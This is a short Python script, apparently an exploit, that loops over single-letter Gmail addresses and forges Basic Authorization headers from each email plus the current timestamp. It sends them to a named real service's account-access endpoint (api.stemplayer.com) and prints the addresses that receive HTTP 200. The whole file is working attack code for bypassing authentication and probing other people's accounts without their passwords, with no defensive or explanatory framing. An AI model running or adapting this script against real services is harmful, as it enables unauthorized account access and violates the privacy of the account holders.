import requests
import time
import base64
import string

for x in list(string.ascii_lowercase):
	email = x + "@gmail.com"
	timestamp = round(int(time.time()))
	authorization = email + ':' + str(timestamp)
	bytes = authorization.encode("utf-8")

	bytes = base64.b64encode(bytes)
	authorization = bytes.decode("utf_8")

	headers = {
		'Authorization': 'Basic ' + authorization
	}
	r = requests.get('https://api.stemplayer.com/accounts/access', headers=headers)
	if r.status_code == 200:
		print(email)